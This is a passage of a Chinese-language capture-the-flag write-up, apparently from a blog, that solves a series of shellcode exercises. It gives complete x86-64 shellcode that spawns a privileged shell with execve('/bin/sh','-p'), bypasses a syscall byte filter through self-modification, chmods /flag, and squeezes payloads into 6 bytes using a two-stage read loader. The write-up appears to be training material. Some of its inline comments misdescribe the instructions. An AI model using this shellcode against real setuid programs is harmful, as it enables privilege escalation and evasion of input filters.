+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#bd93f9">0x68</span> ##push b<span style="color:#f1fa8c">&#39;/bin/sh\x00&#39;</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#bd93f9">0x6e69622f</span>
+</span></span><span style="display:flex;"><span>    mov dword ptr [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">4</span>], <span style="color:#bd93f9">0x732f2f2f</span>
+</span></span><span style="display:flex;"><span>    push rsp
+</span></span><span style="display:flex;"><span>    pop rdi
+</span></span><span style="display:flex;"><span>    push <span style="color:#bd93f9">0x2d006873</span> ## <span style="color:#ff79c6">-</span>h
+</span></span><span style="display:flex;"><span>    mov dword ptr [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">4</span>],<span style="color:#bd93f9">0x70</span> ## p  push argument array [<span style="color:#f1fa8c">&#39;sh\x00&#39;</span>, <span style="color:#f1fa8c">&#39;-p\x00&#39;</span>]
+</span></span><span style="display:flex;"><span>    xor esi,esi
+</span></span><span style="display:flex;"><span>    push rsi ## <span style="color:#ff79c6">null</span> ## 参数数组结束
+</span></span><span style="display:flex;"><span>    push rsp
+</span></span><span style="display:flex;"><span>    add dword ptr [rsp], <span style="color:#bd93f9">0xb</span> ## <span style="color:#ff79c6">/</span>sh\x00
+</span></span><span style="display:flex;"><span>    push rsp
+</span></span><span style="display:flex;"><span>    add dword ptr [rsp],<span style="color:#bd93f9">0x10</span> ## <span style="color:#ff79c6">-</span>p \x00
+</span></span><span style="display:flex;"><span>    push rsp
+</span></span><span style="display:flex;"><span>    pop rsi
+</span></span><span style="display:flex;"><span>    xor edx,edx
+</span></span><span style="display:flex;"><span>    push <span style="color:#bd93f9">0x3b</span> ## execve
+</span></span><span style="display:flex;"><span>    pop rax
+</span></span><span style="display:flex;"><span>    syscall
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div><p>弹一个shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>(cat b.bin ; cat ) <span style="color:#ff79c6">|</span> babyshell_level4
+</span></span></code></pre></div><p>这段命令中，<strong><code>(cat b.bin; cat)</code></strong> 是一个子shell，它执行了两个命令并将它们组合在一起。</p>
+<ol>
+<li><strong><code>cat b.bin</code></strong>：这个命令将文件 <strong><code>b.bin</code></strong> 的内容输出到标准输出。</li>
+<li><strong><code>cat</code></strong>：这个命令等待用户的输入，并将它输出到标准输出。</li>
+</ol>
+<h2 id="level-5过滤syscall">level 5(过滤syscall)</h2>
+<p>过滤了syscall等原语</p>
+<p>不让在代码中出现syscall等原语，如下要求：</p>
+<pre tabindex="0"><code>This challenge requires that your shellcode does not have any `syscall`, &#39;sysenter&#39;, or `int` instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.
+</code></pre><p>想着不让我用0x050f，那我就先弄进去个0x050e然后再inc就是syscall了，这时候再jmp过去即可，因为数据其实就是指令，前面都是用的栈操作，有点习惯这么用了，所以就直接这样写个代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>.intel_syntax noprefix
+</span></span><span style="display:flex;"><span>.global _start
+</span></span><span style="display:flex;"><span>.text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6272a4">/* push b&#39;/bin///sh\x00&#39; */</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#bd93f9">0x68</span>                 <span style="color:#6272a4">// 将字母 &#39;h&#39; 的 ASCII 码（0x68）推入栈顶，作为字符串 &#34;/bin///sh&#34; 的第一个字符 &#39;h&#39;。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    mov rax, <span style="color:#bd93f9">0x732f2f2f6e69622f</span>  <span style="color:#6272a4">// 将字符串 &#34;/bin///sh&#34; 的 ASCII 码（每个字符用一个字节表示）赋值给 rax 寄存器。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    push rax                  <span style="color:#6272a4">// 将字符串 &#34;/bin///sh&#34; 的 ASCII 码依次推入栈顶，形成字符串 &#34;/bin///sh\x00&#34;。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span> <span style="color:#6272a4">/* push argument array [&#39;sh\x00&#39;, &#39;-p\x00&#39;] */</span>
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">0x101010101010101</span>  <span style="color:#6272a4">// 将一个任意的值（在这里是 0x101010101010101）赋值给 rax 寄存器。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    push rax                  <span style="color:#6272a4">// 将 rax 寄存器的值推入栈顶，作为参数数组的结束标志。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    mov rax, <span style="color:#bd93f9">0x101010101010101</span> <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x702d006873</span>  <span style="color:#6272a4">// 计算参数数组的第一个参数 &#39;sh\x00&#39; 的 ASCII 码。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    xor [rsp], rax            <span style="color:#6272a4">// 将栈顶的值（即参数数组的结束标志）与参数 &#39;sh\x00&#39; 的 ASCII 码异或后再放回栈顶，得到参数 &#39;sh\x00&#39;。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    xor esi, esi              <span style="color:#6272a4">// 将 esi 寄存器清零，用作参数数组的结束标志。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    push rsi                  <span style="color:#6272a4">// 将 esi 寄存器的值（即0）推入栈顶，作为参数数组的结束标志。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    push <span style="color:#bd93f9">0xb</span>                  <span style="color:#6272a4">// 将 0xb（即11）推入栈顶，表示参数数组的大小。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    pop rsi                   <span style="color:#6272a4">// 将栈顶的值（即参数数组的大小）移入 rsi 寄存器。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    add rsi, rsp              <span style="color:#6272a4">// 将 rsi 寄存器加上当前栈顶的地址，即得到参数数组的地址。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    push rsi                  <span style="color:#6272a4">// 将参数数组的地址推入栈顶，作为参数数组的起始地址。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    push <span style="color:#bd93f9">0x10</span>                 <span style="color:#6272a4">// 将 0x10（即16）推入栈顶，表示参数数组的大小。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    pop rsi                   <span style="color:#6272a4">// 将栈顶的值（即参数数组的大小）移入 rsi 寄存器。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    add rsi, rsp              <span style="color:#6272a4">// 将 rsi 寄存器加上当前栈顶的地址，即得到参数数组的地址。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    push rsi                  <span style="color:#6272a4">// 将参数数组的地址推入栈顶，作为参数数组的起始地址。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    mov rsi, rsp              <span style="color:#6272a4">// 将参数数组的地址移入 rsi 寄存器，作为 execve 的第二个参数，即参数数组。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    xor edx, edx              <span style="color:#6272a4">// 将 edx 寄存器清零，准备用作环境数组 envp，因为环境数组为空。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">/* call execve() */</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#bd93f9">0x3b</span>                 <span style="color:#6272a4">// 将 0x3b（即59）推入栈顶，作为 execve 系统调用号。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    pop rax                   <span style="color:#6272a4">// 将栈顶的值移入 rax 寄存器，即将 59 移入 rax 作为系统调用号。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    push <span style="color:#bd93f9">0x050e</span>               <span style="color:#6272a4">// 将 0x050e 推入栈顶，表示 execve 的参数个数（即参数数组的大小）。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    inc qword ptr [rsp]       <span style="color:#6272a4">// 将栈顶的值（即参数数组的大小）加一。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    jmp rsp                   <span style="color:#6272a4">// 跳转到栈顶所指向的地址执行。
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    nop                       <span style="color:#6272a4">// 占位符指令，不做任何操作。
+</span></span></span></code></pre></div><h2 id="level-7">level 7</h2>
+<p>把标准输出和标准错误输出禁止了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>chmod(<span style="color:#f1fa8c">&#34;/flag&#34;</span>,<span style="color:#bd93f9">4</span>)
+</span></span><span style="display:flex;"><span>## 设置为只读
+</span></span></code></pre></div><p>shellcode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>.intel_syntax noprefix
+</span></span><span style="display:flex;"><span>.global _start
+</span></span><span style="display:flex;"><span>.text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 将文件路径压入栈
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">0x0067616c662f</span>    ## 小端模式下的字符串 <span style="color:#f1fa8c">&#34;/flag&#34;</span> (不含NULL终结符)
+</span></span><span style="display:flex;"><span>    push rax                   ## 压入栈中
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 准备系统调用参数
+</span></span><span style="display:flex;"><span>    mov rdi, rsp               ## rdi是第一个参数，文件路径：从栈顶获取路径
+</span></span><span style="display:flex;"><span>    mov rsi, <span style="color:#bd93f9">4</span>                 ## rsi是第二个参数，权限值：设置为4
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">0x5a</span>              ## rax是系统调用号，<span style="color:#bd93f9">90</span> (<span style="color:#bd93f9">0x5a</span>) 是chmod的调用号
+</span></span><span style="display:flex;"><span>    syscall                    ## 执行系统调用
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 清理栈
+</span></span><span style="display:flex;"><span>    add rsp, <span style="color:#bd93f9">8</span>                 ## 移除栈上的路径
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 退出程序
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">60</span>                ## 系统调用号60是exit
+</span></span><span style="display:flex;"><span>    xor rdi, rdi               ## 退出码0
+</span></span><span style="display:flex;"><span>    syscall                    ## 执行系统调用
+</span></span></code></pre></div><h2 id="level-8">level 8</h2>
+<p>Write and execute shellcode to read the flag, but you only get 18 bytes.</p>
+<p>只有18bytes的空间，</p>
+<p>其实直接用上一问的就行 去掉后面的清理栈和退出程序的代码</p>
+<p>考虑到</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>execve(<span style="color:#f1fa8c">&#39;c&#39;</span>)
+</span></span></code></pre></div><p>我们可以写一个脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#6272a4">// catflag.c
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">void</span> main()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    system(<span style="color:#f1fa8c">&#34;cat /flag&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>mov al, <span style="color:#bd93f9">0x3b</span>
+</span></span><span style="display:flex;"><span>push rax
+</span></span><span style="display:flex;"><span>mov rdi, rsp 
+</span></span><span style="display:flex;"><span>xor rsi, rsi
+</span></span><span style="display:flex;"><span>xor rdx, rdx
+</span></span><span style="display:flex;"><span>syscall
+</span></span></code></pre></div><p>或者直接用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#bd93f9">0000000000001000</span> &lt;<span style="color:#ff79c6">_start</span>&gt;<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">1000</span><span style="color:#ff79c6">:</span>       <span style="color:#bd93f9">68</span> <span style="color:#bd93f9">66</span> <span style="color:#bd93f9">6</span>c <span style="color:#bd93f9">61</span> <span style="color:#bd93f9">67</span>          push   <span style="color:#bd93f9">0x67616c66</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">1005</span><span style="color:#ff79c6">:</span>       <span style="color:#bd93f9">54</span>                      push   rsp
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">1006</span><span style="color:#ff79c6">:</span>       <span style="color:#bd93f9">5</span>f                      pop    rdi
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">1007</span><span style="color:#ff79c6">:</span>       <span style="color:#bd93f9">40</span> b6 <span style="color:#bd93f9">04</span>                mov    sil,<span style="color:#bd93f9">0x4</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">100</span>a<span style="color:#ff79c6">:</span>       b0 <span style="color:#bd93f9">5</span>a                   mov    al,<span style="color:#bd93f9">0x5a</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">100</span>c<span style="color:#ff79c6">:</span>       <span style="color:#bd93f9">0</span>f <span style="color:#bd93f9">05</span>                   syscall 
+</span></span></code></pre></div><h2 id="level-9">level 9</h2>
+<p>每隔10字节就会用10个中断替换，用循环跳过就行了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>push <span style="color:#bd93f9">0x63</span>
+</span></span><span style="display:flex;"><span>mov rdi, rsp
+</span></span><span style="display:flex;"><span>xor esi, esi
+</span></span><span style="display:flex;"><span>cdq
+</span></span><span style="display:flex;"><span>jmp next
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span>rep <span style="color:#bd93f9">10</span>
+</span></span><span style="display:flex;"><span>nop
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span>endrep
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>next<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>mov al,<span style="color:#bd93f9">0x3b</span>
+</span></span><span style="display:flex;"><span>syscall
+</span></span></code></pre></div><ol>
+<li>将**<code>0x63</code><strong>压入堆栈，即将字符</strong><code>c</code>**的ASCII码值压入堆栈。</li>
+<li>将堆栈指针（rsp）的值存储到rdi寄存器中，即将字符**<code>c</code>**的ASCII码值的地址存储到rdi寄存器中。</li>
+<li>将esi寄存器清零，为后续的系统调用做准备。</li>
+<li>使用**<code>cdq</code>**指令将rax寄存器（64位）的内容符号扩展到rdx寄存器中（rdx的值为0）。</li>
+<li>使用**<code>jmp next</code><strong>指令跳转到</strong><code>next</code>**标签处。</li>
+<li>使用**<code>%rept 10</code><strong>宏指令和</strong><code>%endrep</code><strong>结束宏指令，重复10次填充</strong><code>nop</code>**指令，以保证每隔10字节的位置不受影响。</li>
+<li>标签**<code>next</code>**处开始执行后续指令。</li>
+<li>将系统调用号**<code>0x3b</code>**（execve系统调用号）存储到al寄存器中。</li>
+<li>调用syscall指令触发系统调用，执行execve系统调用。</li>
+</ol>
+<h4 id="扩展指令-cdq">扩展指令 cdq</h4>
+<p>扩展指令<code>cdq</code>，这个指令的作用是将eax的最高位即31位赋值给edx的每一位，这个指令一般是在32位系统中除法前使用的，就是让edx作为eax的高位组合成64位的数字，让符号统一
+这条指令只有1字节，用它一般就能代替<code>xor edx, edx</code>这条指令了，便又节省1字节，那么这个shellcode也能剪短到12字节，和上面一样：</p>
+<h2 id="level-10">level 10</h2>
+<p>排序了 其实就是大端序</p>
+<p>没什么必要 继续shellcode执行c语言</p>
+<h2 id="level-11">level 11</h2>
+<p>依然是排序了 然后不让用stdin</p>
+<p>问题不大 依然是level8的链接了c脚本的代码</p>
+<h2 id="level-12">level 12</h2>
+<p>This challenge requires that every byte in your shellcode is unique!</p>
+<p>乐了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>push <span style="color:#bd93f9">0x61</span>
+</span></span><span style="display:flex;"><span>  mov rdi, rsp
+</span></span><span style="display:flex;"><span>  xor esi, esi
+</span></span><span style="display:flex;"><span>  cdq
+</span></span><span style="display:flex;"><span>  mov al,<span style="color:#bd93f9">0x3b</span>
+</span></span><span style="display:flex;"><span>  syscall
+</span></span></code></pre></div><h2 id="level-13">level 13</h2>
+<p>只有12个bytes</p>
+<p>同样</p>
+<h2 id="level-14">level 14</h2>
+<p>Write and execute shellcode to read the flag, but this time you only get 6 bytes :)</p>
+<p>用gdb调试 断在执行shellcode前</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">:</span> x<span style="color:#ff79c6">/</span><span style="color:#bd93f9">20</span>i $pc
+</span></span><span style="display:flex;"><span>=&gt; <span style="color:#bd93f9">0x55cec213b7ca</span> &lt;<span style="color:#ff79c6">main</span>+<span style="color:#50fa7b">611</span>&gt;<span style="color:#ff79c6">:</span>   call   rdx
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7cc</span> &lt;<span style="color:#ff79c6">main</span>+<span style="color:#50fa7b">613</span>&gt;<span style="color:#ff79c6">:</span>   mov    eax,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7d1</span> &lt;<span style="color:#ff79c6">main</span>+<span style="color:#50fa7b">618</span>&gt;<span style="color:#ff79c6">:</span>   leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7d2</span> &lt;<span style="color:#ff79c6">main</span>+<span style="color:#50fa7b">619</span>&gt;<span style="color:#ff79c6">:</span>   ret    
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7d3</span><span style="color:#ff79c6">:</span>      nop    WORD PTR cs<span style="color:#ff79c6">:</span>[rax<span style="color:#ff79c6">+</span>rax<span style="color:#ff79c6">*</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7dd</span><span style="color:#ff79c6">:</span>      nop    DWORD PTR [rax]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7e0</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>&gt;<span style="color:#ff79c6">:</span>    endbr64 
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7e4</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">4</span>&gt;<span style="color:#ff79c6">:</span>  push   r15
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7e6</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">6</span>&gt;<span style="color:#ff79c6">:</span>  lea    r15,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x255b</span>]        ## <span style="color:#bd93f9">0x55cec213dd48</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7ed</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">13</span>&gt;<span style="color:#ff79c6">:</span> push   r14
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7ef</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">15</span>&gt;<span style="color:#ff79c6">:</span> mov    r14,rdx
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7f2</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">18</span>&gt;<span style="color:#ff79c6">:</span> push   r13
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7f4</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">20</span>&gt;<span style="color:#ff79c6">:</span> mov    r13,rsi
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7f7</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">23</span>&gt;<span style="color:#ff79c6">:</span> push   r12
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7f9</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">25</span>&gt;<span style="color:#ff79c6">:</span> mov    r12d,edi
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7fc</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">28</span>&gt;<span style="color:#ff79c6">:</span> push   rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b7fd</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">29</span>&gt;<span style="color:#ff79c6">:</span> lea    rbp,[rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x254c</span>]        ## <span style="color:#bd93f9">0x55cec213dd50</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b804</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">36</span>&gt;<span style="color:#ff79c6">:</span> push   rbx
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b805</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">37</span>&gt;<span style="color:#ff79c6">:</span> sub    rbp,r15
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x55cec213b808</span> &lt;<span style="color:#ff79c6">__libc_csu_init</span>+<span style="color:#50fa7b">40</span>&gt;<span style="color:#ff79c6">:</span> sub    rsp,<span style="color:#bd93f9">0x8</span>
+</span></span><span style="display:flex;"><span>(gdb) info registers
+</span></span><span style="display:flex;"><span>rax            <span style="color:#bd93f9">0x0</span>                 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>rbx            <span style="color:#bd93f9">0x55cec213b7e0</span>      <span style="color:#bd93f9">94346507696096</span>
+</span></span><span style="display:flex;"><span>rcx            <span style="color:#bd93f9">0x7fb904beb077</span>      <span style="color:#bd93f9">140432625283191</span>
+</span></span><span style="display:flex;"><span>rdx            <span style="color:#bd93f9">0x22ef2000</span>          <span style="color:#bd93f9">586096640</span>
+</span></span><span style="display:flex;"><span>rsi            <span style="color:#bd93f9">0x55cec2eb42a0</span>      <span style="color:#bd93f9">94346521821856</span>
+</span></span><span style="display:flex;"><span>rdi            <span style="color:#bd93f9">0x7fb904ccb7e0</span>      <span style="color:#bd93f9">140432626202592</span>
+</span></span><span style="display:flex;"><span>rbp            <span style="color:#bd93f9">0x7ffd22e32530</span>      <span style="color:#bd93f9">0x7ffd22e32530</span>
+</span></span><span style="display:flex;"><span>rsp            <span style="color:#bd93f9">0x7ffd22e324f0</span>      <span style="color:#bd93f9">0x7ffd22e324f0</span>
+</span></span><span style="display:flex;"><span>r8             <span style="color:#bd93f9">0x16</span>                <span style="color:#bd93f9">22</span>
+</span></span><span style="display:flex;"><span>r9             <span style="color:#bd93f9">0x3</span>                 <span style="color:#bd93f9">3</span>
+</span></span><span style="display:flex;"><span>r10            <span style="color:#bd93f9">0x55cec213c105</span>      <span style="color:#bd93f9">94346507698437</span>
+</span></span><span style="display:flex;"><span>r11            <span style="color:#bd93f9">0x246</span>               <span style="color:#bd93f9">582</span>
+</span></span><span style="display:flex;"><span>r12            <span style="color:#bd93f9">0x55cec213b1e0</span>      <span style="color:#bd93f9">94346507694560</span>
+</span></span><span style="display:flex;"><span>r13            <span style="color:#bd93f9">0x7ffd22e32620</span>      <span style="color:#bd93f9">140725188765216</span>
+</span></span><span style="display:flex;"><span>r14            <span style="color:#bd93f9">0x0</span>                 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>r15            <span style="color:#bd93f9">0x0</span>                 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>rip            <span style="color:#bd93f9">0x55cec213b7ca</span>      <span style="color:#bd93f9">0x55cec213b7ca</span> &lt;<span style="color:#ff79c6">main</span>+<span style="color:#50fa7b">611</span>&gt;
+</span></span><span style="display:flex;"><span>eflags         <span style="color:#bd93f9">0x246</span>               [ PF ZF IF ]
+</span></span><span style="display:flex;"><span>cs             <span style="color:#bd93f9">0x33</span>                <span style="color:#bd93f9">51</span>
+</span></span><span style="display:flex;"><span>ss             <span style="color:#bd93f9">0x2b</span>                <span style="color:#bd93f9">43</span>
+</span></span><span style="display:flex;"><span>ds             <span style="color:#bd93f9">0x0</span>                 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>es             <span style="color:#bd93f9">0x0</span>                 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>fs             <span style="color:#bd93f9">0x0</span>                 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>gs             <span style="color:#bd93f9">0x0</span>                 <span style="color:#bd93f9">0</span>
+</span></span></code></pre></div><p>在运行shellcode之前，<code>rax = 0; rdx = 0x22ef2000</code>，<code>rdx</code>的值正好是可以布置shellcode的地址。利用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>xchg esi, edx
+</span></span><span style="display:flex;"><span>xor edi, edi
+</span></span><span style="display:flex;"><span>syscall
+</span></span></code></pre></div><p>实现<code>read(0, shellcode_mem, length)</code>，然后利用<code>read</code>再次读入shellcode
+因为写地址在0x2e15e000是程序开始的地方，而read函数运行时rip已经到6字节后的地方了，所以前面要放上一些nop以覆盖前面的指令，所以差不多就是这个样子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>.rept <span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>nop
+</span></span><span style="display:flex;"><span>.endr
+</span></span><span style="display:flex;"><span>execve(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>,[<span style="color:#f1fa8c">&#34;sh&#34;</span>,<span style="color:#f1fa8c">&#34;-p&#34;</span>])
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>.intel_syntax noprefix
+</span></span><span style="display:flex;"><span>.global _start
+</span></span><span style="display:flex;"><span>.text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>.rept <span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>nop
+</span></span><span style="display:flex;"><span>.endr
+</span></span><span style="display:flex;"><span> ## 将 <span style="color:#f1fa8c">&#34;/flag&#34;</span> 推入栈
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">0x67616c662f</span>     ## <span style="color:#f1fa8c">&#34;/flag&#34;</span> 的 ASCII 码
+</span></span><span style="display:flex;"><span>    push rax                  ## 将 <span style="color:#f1fa8c">&#34;/flag&#34;</span> 压入栈
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 执行系统调用 open(<span style="color:#f1fa8c">&#34;/flag&#34;</span>, O_RDONLY)
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">2</span>                ## 系统调用号：<span style="color:#bd93f9">2</span> (open)
